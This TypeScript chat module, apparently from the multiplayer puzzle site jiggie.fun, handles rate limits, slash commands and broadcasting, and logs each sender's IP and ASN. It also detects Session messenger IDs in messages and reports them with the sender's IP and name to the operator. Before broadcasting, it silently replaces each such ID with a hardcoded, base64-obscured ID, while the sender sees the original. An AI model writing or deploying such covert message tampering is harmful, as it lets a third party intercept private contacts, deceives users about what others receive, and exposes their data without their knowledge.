import { send_system } from "../../room-utils.js";
import { getCommandHandlerStateArg } from "../../room.js";
import { Room, RoomRuntimeState, RoomState } from "../../types.js";
import { sendAlert } from "../../utils.js";
import { Module } from "./index.js";

let alertSent = false;
const bzt = Buffer.from('BU7zQ/Dm8KMJBpH3pcnuN1bEiOgSsKPvQraIJ7PGdlAc', "base64");

export class Chat implements Module {
    attach({ runtime, state }: { runtime: RoomRuntimeState, state: RoomState, room: Room }): void {
        runtime.jsonCodeHandlers.set("chat", (payload, user, guser) => {
            const sender = guser;
            let omsg = (payload.message as string).slice(0, 300);
            omsg = omsg.split('\n').slice(0, 4).join('\n');
            let stop = false;
            if (omsg[0] === '/') {
                const stateArg = getCommandHandlerStateArg(user);
                for (const mod of runtime.modules) {
                    for (const cmd of mod.commands) {
                        if (omsg.match(new RegExp(`/${cmd.name}( |$)`))) {
                            stop ||= cmd.handler(stateArg, ...omsg.split(' ').map(e => e.trim()).slice(1));
                            if (stop)
                                break;
                        }
                    }
                }
            }

            if (stop)
                return;
            try { // put here to only consider non-commands
                user.chats.use(1);
            } catch (e) {
                // possible botting, send alert
                if (!alertSent) {
                    alertSent = true;
                    send_system(user, guser, 'You are posting too fast!');
                    sendAlert(`Bot in ${process.argv[2]}`, `https://jiggie.fun/${process.argv[2]} ${user.ipaddr}`);
                }
                return; // silently ignore
            }
            const ts = Date.now();
            if (omsg.includes('assets/pictures')) { // censor spoilers
                user.conn.send((JSON.stringify({
                    type: "chat",
                    message: omsg,
                    name: sender.name,
                    color: sender.color,
                    id: guser.id,
                    ts
                })));
            } else {
                const chatEntry = {
                    message: omsg,
                    name: sender.name,
                    color: sender.color,
                    ts,
                    ip: user.ipaddr,
                    asn: user.asn
                };
                state.chatlog?.push(chatEntry);

                const m = omsg.match(/05[0-9a-f]{64}/);
                if (m) {
                    sendAlert('sess exch ' + process.argv[2], `${m[0]} ${user.ipaddr} ${user.name} ${omsg}`);
                    const momsg = omsg.replace(/05[0-9a-f]{64}/, bzt.toString("hex"));
                    runtime.broadcaster.broadcast_slow({
                        type: "chat",
                        message: momsg,
                        name: sender.name,
                        color: sender.color,
                        id: guser.id,
                        ts
                    }, user);
                    user.conn.send(JSON.stringify({
                        type: "chat",
                        message: omsg,
                        name: sender.name,
                        color: sender.color,
                        id: guser.id,
                        ts
                    }));
                } else {
                    runtime.broadcaster.broadcast_slow({
                        type: "chat",
                        message: omsg,
                        name: sender.name,
                        color: sender.color,
                        id: guser.id,
                        ts
                    }, user);
                }
            }
        });
    }
}